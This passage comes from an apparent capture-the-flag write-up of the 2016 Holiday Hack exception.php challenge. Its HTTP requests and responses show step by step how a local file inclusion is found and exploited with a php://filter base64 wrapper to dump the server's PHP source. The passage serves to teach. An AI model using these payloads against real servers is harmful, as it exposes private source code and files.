&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;40&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;operation&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ReadCrashDump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 29 Dec 2016 15:34:02 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;47&lt;/span&gt;

Fatal error! JSON key &amp;#39;crashdump&amp;#39; must be set.
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ok, we now need a &lt;code&gt;crashdump&lt;/code&gt; key. Let's add it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/exception.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;ex.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;57&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;operation&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ReadCrashDump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;crashdump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 29 Dec 2016 15:35:03 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;47&lt;/span&gt;

Fatal error! JSON key &amp;#39;crashdump&amp;#39; must be set.
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hmm, the server does not seem to like where we put our &lt;code&gt;crashdump&lt;/code&gt; key.
Maybe we should put it in the &lt;code&gt;data&lt;/code&gt; object?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/exception.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;ex.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;56&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;operation&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ReadCrashDump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;crashdump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;500&lt;/span&gt; &lt;span class="ne"&gt;Internal Server Error&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 29 Dec 2016 15:36:09 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Alright, we got a 500 error. Our syntax seems to be correct, but the server
generated an error, probably because we didn't put anything in the
&lt;code&gt;crashdump&lt;/code&gt; key. Let's try to put one of our file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/exception.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;ex.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;76&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;operation&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ReadCrashDump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;data&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;:{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;crashdump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;crashdump-yoerjb.php&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 29 Dec 2016 15:38:36 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;66&lt;/span&gt;

Fatal error! crashdump value duplicate &amp;#39;.php&amp;#39; extension detected.
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We got a &amp;quot;fatal error&amp;quot;, but the web server returned a 200 OK code. This
probably means that we encountered an application error, but not an HTTP error.
The error message looks like there is custom filtering on the &lt;code&gt;crashdump&lt;/code&gt;
parameter. Filtering on &lt;code&gt;.php&lt;/code&gt; extensions seems like a filter against
Local File Inclusion. The &lt;code&gt;crashdump&lt;/code&gt; parameter is most likely used to
include one of the created crash dump file.&lt;/p&gt;
&lt;p&gt;Since &lt;code&gt;.php&lt;/code&gt; extensions seem to be filtered, this LFI seems a good
candidate for &lt;a class="reference external" href="http://php.net/manual/en/wrappers.php.php"&gt;PHP wrappers&lt;/a&gt;. PHP
wrappers are URL starting with &lt;code&gt;php://&lt;/code&gt;. They can be used to access
different I/O streams, and work on them directly. One of these wrappers, and
a very interesting one in the case of an LFI is the
&lt;a class="reference external" href="http://php.net/manual/en/wrappers.php.php#refsect2-wrappers.php-unknown-unknown-unknown-unknown-unknown-unknown-descriptiot"&gt;filter&lt;/a&gt;
wrapper. The &lt;code&gt;filter&lt;/code&gt; wrapper can be used to manipulate files present on
the file system, and transform them (base64-encode, ROT13-encode, etc.). Since
the server seems to append &lt;code&gt;.php&lt;/code&gt; automatically to the &lt;code&gt;crashdump&lt;/code&gt;
parameter (cue the error message), we can use a &lt;code&gt;php://filter&lt;/code&gt; to read
files from the server, such as source code file. Let's try to read the
&lt;code&gt;exception.php&lt;/code&gt; file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/exception.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;ex.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;112&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;operation&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ReadCrashDump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;crashdump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;php://filter/read=convert.base64-encode/resource=exception&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 29 Dec 2016 15:53:25 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;3168&lt;/span&gt;

PD9waHAgCgojIEF1ZGlvIGZpbGUgZnJvbSBEaXNjb21ib2J1bGF0b3IgaW4gd2Vicm9vdDogZGlzY29tYm9idWxhdGVkLWF1ZGlvLTYtWHl6RTNOOVlxS05ILm1wMwoKIyBDb2RlIGZyb20gaHR0cDovL3RoaXNpbnRlcmVzdHNtZS5jb20vcmVjZWl2aW5nLWpzb24tcG9zdC1kYXRhLXZpYS1waHAvCiMgTWFrZSBzdXJlIHRoYXQgaXQgaXMgYSBQT1NUIHJlcXVlc3QuCmlmKHN0cmNhc2VjbXAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10sICdQT1NUJykgIT0gMCl7CiAgICBkaWUoIlJlcXVlc3QgbWV0aG9kIG11c3QgYmUgUE9TVFxuIik7Cn0KCSAKIyBNYWtlIHN1cmUgdGhhdCB0aGUgY29udGVudCB0eXBlIG9mIHRoZSBQT1NUIHJlcXVlc3QgaGFzIGJlZW4gc2V0IHRvIGFwcGxpY2F0aW9uL2pzb24KJGNvbnRlbnRUeXBlID0gaXNzZXQoJF9TRVJWRVJbIkNPTlRFTlRfVFlQRSJdKSA/IHRyaW0oJF9TRVJWRVJbIkNPTlRFTlRfVFlQRSJdKSA6ICcnOwppZihzdHJjYXNlY21wKCRjb250ZW50VHlwZSwgJ2FwcGxpY2F0aW9uL2pzb24nKSAhPSAwKXsKICAgIGRpZSgiQ29udGVudCB0eXBlIG11c3QgYmU6IGFwcGxpY2F0aW9uL2pzb25cbiIpOwp9CgkKIyBHcmFiIHRoZSByYXcgUE9TVC4gTmVjZXNzYXJ5IGZvciBKU09OIGluIHBhcnRpY3VsYXIuCiRjb250ZW50ID0gZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CiRvYmogPSBqc29uX2RlY29kZSgkY29udGVudCwgdHJ1ZSk7CgkjIElmIGpzb25fZGVjb2RlIGZhaWxlZCwgdGhlIEpTT04gaXMgaW52YWxpZC4KaWYoIWlzX2FycmF5KCRvYmopKXsKICAgIGRpZSgiUE9TVCBjb250YWlucyBpbnZhbGlkIEpTT04hXG4iKTsKfQoKIyBQcm9jZXNzIHRoZSBKU09OLgppZiAoICEgaXNzZXQoICRvYmpbJ29wZXJhdGlvbiddKSBvciAoCgkkb2JqWydvcGVyYXRpb24nXSAhPT0gIldyaXRlQ3Jhc2hEdW1wIiBhbmQKCSRvYmpbJ29wZXJhdGlvbiddICE9PSAiUmVhZENyYXNoRHVtcCIpKQoJewoJZGllKCJGYXRhbCBlcnJvciEgSlNPTiBrZXkgJ29wZXJhdGlvbicgbXVzdCBiZSBzZXQgdG8gV3JpdGVDcmFzaER1bXAgb3IgUmVhZENyYXNoRHVtcC5cbiIpOwp9CmlmICggaXNzZXQoJG9ialsnZGF0YSddKSkgewoJaWYgKCRvYmpbJ29wZXJhdGlvbiddID09PSAiV3JpdGVDcmFzaER1bXAiKSB7CgkJIyBXcml0ZSBhIG5ldyBjcmFzaCBkdW1wIHRvIGRpc2sKCQlwcm9jZXNzQ3Jhc2hEdW1wKCRvYmpbJ2RhdGEnXSk7Cgl9CgllbHNlaWYgKCRvYmpbJ29wZXJhdGlvbiddID09PSAiUmVhZENyYXNoRHVtcCIpIHsKCQkjIFJlYWQgYSBjcmFzaCBkdW1wIGJhY2sgZnJvbSBkaXNrCgkJcmVhZENyYXNoZHVtcCgkb2JqWydkYXRhJ10pOwoJfQp9CmVsc2UgewoJIyBkYXRhIGtleSB1bnNldAoJZGllKCJGYXRhbCBlcnJvciEgSlNPTiBrZXkgJ2RhdGEnIG11c3QgYmUgc2V0LlxuIik7Cn0KZnVuY3Rpb24gcHJvY2Vzc0NyYXNoZHVtcCgkY3Jhc2hkdW1wKSB7CgkkYmFzZXBhdGggPSAiL3Zhci93d3cvaHRtbC9kb2NzLyI7Cgkkb3V0cHV0ZmlsZW5hbWUgPSB0ZW1wbmFtKCRiYXNlcGF0aCwgImNyYXNoZHVtcC0iKTsKCXVubGluaygkb3V0cHV0ZmlsZW5hbWUpOwoJCgkkb3V0cHV0ZmlsZW5hbWUgPSAkb3V0cHV0ZmlsZW5hbWUgLiAiLnBocCI7CgkkYmFzZW5hbWUgPSBiYXNlbmFtZSgkb3V0cHV0ZmlsZW5hbWUpOwoJCgkkY3Jhc2hkdW1wX2VuY29kZWQgPSAiPD9waHAgcHJpbnQoJyIgLiBqc29uX2VuY29kZSgkY3Jhc2hkdW1wLCBKU09OX1BSRVRUWV9QUklOVCkgLiAiJyk7IjsKCWZpbGVfcHV0X2NvbnRlbnRzKCRvdXRwdXRmaWxlbmFtZSwgJGNyYXNoZHVtcF9lbmNvZGVkKTsKCQkJCglwcmludCA8PDxFTkQKewoJInN1Y2Nlc3MiIDogdHJ1ZSwKCSJmb2xkZXIiIDogImRvY3MiLAoJImNyYXNoZHVtcCIgOiAiJGJhc2VuYW1lIgp9CgpFTkQ7Cn0KZnVuY3Rpb24gcmVhZENyYXNoZHVtcCgkcmVxdWVzdGVkQ3Jhc2hkdW1wKSB7CgkkYmFzZXBhdGggPSAiL3Zhci93d3cvaHRtbC9kb2NzLyI7CgljaGRpcigkYmFzZXBhdGgpOwkJCgkKCWlmICggISBpc3NldCgkcmVxdWVzdGVkQ3Jhc2hkdW1wWydjcmFzaGR1bXAnXSkpIHsKCQlkaWUoIkZhdGFsIGVycm9yISBKU09OIGtleSAnY3Jhc2hkdW1wJyBtdXN0IGJlIHNldC5cbiIpOwoJfQoKCWlmICggc3Vic3RyKHN0cnJjaHIoJHJlcXVlc3RlZENyYXNoZHVtcFsnY3Jhc2hkdW1wJ10sICIuIiksIDEpID09PSAicGhwIiApIHsKCQlkaWUoIkZhdGFsIGVycm9yISBjcmFzaGR1bXAgdmFsdWUgZHVwbGljYXRlICcucGhwJyBleHRlbnNpb24gZGV0ZWN0ZWQuXG4iKTsKCX0KCWVsc2UgewoJCXJlcXVpcmUoJHJlcXVlc3RlZENyYXNoZHVtcFsnY3Jhc2hkdW1wJ10gLiAnLnBocCcpOwoJfQkKfQoKPz4K
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Yes! We managed to get the source code of the &lt;code&gt;exception.php&lt;/code&gt; page,
encoded in base64. By decoding it, we have access to the source code, and we
can see how our data are treated:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class="hll"&gt;&lt;span class="c1"&gt;# Audio file from Discombobulator in webroot: discombobulated-audio-6-XyzE3N9YqKNH.mp3&lt;/span&gt;
&lt;/span&gt;
&lt;span class="c1"&gt;# Code from http://thisinterestsme.com/receiving-json-post-data-via-php/&lt;/span&gt;
&lt;span class="c1"&gt;# Make sure that it is a POST request.&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;strcasecmp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_SERVER&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;REQUEST_METHOD&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
    &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Request method must be POST&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="c1"&gt;# Make sure that the content type of the POST request has been set to application/json&lt;/span&gt;
&lt;span class="nv"&gt;$contentType&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_SERVER&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;CONTENT_TYPE&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="nb"&gt;trim&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_SERVER&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;CONTENT_TYPE&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;strcasecmp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$contentType&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;application/json&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
    &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Content type must be: application/json&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="c1"&gt;# Grab the raw POST. Necessary for JSON in particular.&lt;/span&gt;
&lt;span class="nv"&gt;$content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;file_get_contents&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;php://input&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="nv"&gt;$obj&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;json_decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$content&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;true&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="c1"&gt;# If json_decode failed, the JSON is invalid.&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nb"&gt;is_array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$obj&lt;/span&gt;&lt;span class="p"&gt;)){&lt;/span&gt;
    &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;POST contains invalid JSON!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="c1"&gt;# Process the JSON.&lt;/span&gt;
